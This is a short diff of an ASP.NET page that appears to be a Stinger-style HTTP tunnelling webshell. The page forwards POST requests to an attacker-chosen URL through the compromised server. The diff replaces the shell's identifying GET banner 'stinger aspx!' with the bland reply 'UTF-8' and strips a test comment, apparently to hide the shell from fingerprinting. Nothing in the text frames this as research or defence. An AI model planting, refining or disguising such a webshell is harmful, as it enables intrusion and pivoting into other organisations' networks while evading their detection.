@@ -1,11 +1,10 @@
 ﻿<%@ Page Language="C#" Debug="true"%>
-
 <%@ Import Namespace="System.IO" %>
 <%@ Import Namespace="System.Net" %>
 <%
     if (Request.HttpMethod == "GET")
     {
-        Response.Write("stinger aspx!");
+        Response.Write("UTF-8");
         return;
     }
     else
@@ -24,7 +23,6 @@
         
         HttpWebRequest newrequest = (HttpWebRequest)WebRequest.Create(url+"?"+post_arg);
         newrequest.Method = "POST";
-        //buffer = System.Text.Encoding.Default.GetBytes("test=testestrsetestset");
         if (buffer.Length >= 0)
         {
             System.IO.Stream requestStream = null;
